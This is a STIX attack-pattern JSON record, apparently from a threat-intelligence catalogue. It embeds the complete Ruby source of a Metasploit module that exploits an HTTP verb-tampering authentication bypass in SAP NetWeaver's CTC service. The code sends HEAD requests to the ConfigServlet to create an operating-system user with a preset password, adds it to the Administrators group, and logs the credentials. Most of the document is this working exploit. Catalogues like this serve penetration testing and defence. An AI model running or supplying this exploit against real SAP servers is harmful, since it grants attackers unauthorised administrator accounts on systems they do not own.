{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d0656aa0-910c-4541-bedf-c373410b0e1b",
    "created": "2024-08-14T16:27:01.283133Z",
    "modified": "2024-08-14T16:27:01.283137Z",
    "name": "SAP CTC Service Verb Tampering User Management",
    "description": " This module exploits an authentication bypass vulnerability in SAP NetWeaver CTC service. The service is vulnerable to verb tampering allowing for unauthorised OS user management. Information about resolution should be available at SAP notes 1589525 and 1624450 (authentication required).  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb",
            "external_id": "sap_ctc_verb_tampering_user_mgmt.rb"
        },
        {
            "source_name": "reference",
            "url": "http://erpscan.com/wp-content/uploads/2012/11/Breaking-SAP-Portal-HackerHalted-2012.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n##\n# This module is based on, inspired by, or is a port of a plugin available in\n# the Onapsis Bizploit Opensource ERP Penetration Testing framework -\n# http://www.onapsis.com/research-free-solutions.php.\n# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts\n# in producing the Metasploit modules and was happy to share his knowledge and\n# experience - a very cool guy.\n#\n# The following guys from ERP-SCAN deserve credit for their contributions -\n# Alexandr Polyakov, Alexey Sintsov, Alexey Tyurin, Dmitry Chastukhin and\n# Dmitry Evdokimov.\n#\n# I'd also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis\n# who have Beta tested the modules and provided excellent feedback. Some people\n# just seem to enjoy hacking SAP :)\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name' => 'SAP CTC Service Verb Tampering User Management',\n      'Description' => %q{\n          This module exploits an authentication bypass vulnerability in SAP NetWeaver\n        CTC service. The service is vulnerable to verb tampering allowing for unauthorised\n        OS user management. Information about resolution should be available at SAP notes\n        1589525 and 1624450 (authentication required).\n      },\n      'References' =>\n        [\n          [ 'URL', 'http://erpscan.com/advisories/dsecrg-11-041-sap-netweaver-authentication-bypass-verb-tampering/' ],\n          [ 'URL', 'http://erpscan.com/wp-content/uploads/2012/11/Breaking-SAP-Portal-HackerHalted-2012.pdf' ]\n        ],\n      'Author' =>\n        [\n          'Alexandr Polyakov', # Vulnerability discovery\n          'nmonkee' # Metasploit module\n        ],\n      'License' => MSF_LICENSE\n    )\n\n    register_options([\n      Opt::RPORT(50000),\n      OptString.new('USERNAME', [true, 'Username to create', 'msf']),\n      OptString.new('PASSWORD', [true, 'Password for the new user', '$Metasploit1234$']),\n      OptString.new('GROUP', [true, 'Group for the new user', 'Administrators'])\n    ])\n  end\n\n  def run_host(ip)\n    vprint_status(\"#{rhost}:#{rport} - Creating User...\")\n    uri = '/ctc/ConfigServlet?param=com.sap.ctc.util.UserConfig;CREATEUSER;USERNAME=' + datastore['USERNAME'] + ',PASSWORD=' + datastore['PASSWORD']\n    if send_request(uri)\n      print_good(\"#{rhost}:#{rport} - User #{datastore['USERNAME']} with password #{datastore['PASSWORD']} successfully created\")\n    else\n      return\n    end\n\n    vprint_status(\"#{rhost}:#{rport} - Adding User to Group...\")\n    uri = '/ctc/ConfigServlet?param=com.sap.ctc.util.UserConfig;ADD_USER_TO_GROUP;USERNAME=' + datastore['USERNAME'] + ',GROUPNAME=' + datastore['GROUP']\n    res = send_request(uri)\n    if res\n      print_good(\"#{rhost}:#{rport} - User #{datastore['USERNAME']} added to group #{datastore['GROUP']}\")\n    else\n      return\n    end\n\n    report_cred(\n      ip: rhost,\n      port: rport,\n      service_name: 'sap',\n      user: datastore['USERNAME'],\n      pass: datastore['PASSWORD'],\n      proof: res.body\n    )\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def send_request(uri)\n    begin\n      res = send_request_cgi({\n        'uri' => uri,\n        'method' => 'HEAD',\n        'ctype' => 'text/xml; charset=UTF-8',\n        'cookie' => 'sap-usercontext=sap-language=EN'\n      })\n      if res and res.code == 200 and res.headers['Server'] =~ /SAP J2EE Engine/\n        return true\n      elsif res\n        vprint_error(\"#{rhost}:#{rport} - Unexpected Response: #{res.code} #{res.message}\")\n        return false\n      end\n    rescue ::Rex::ConnectionError\n      vprint_error(\"#{rhost}:#{rport} - Unable to connect\")\n      return false\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}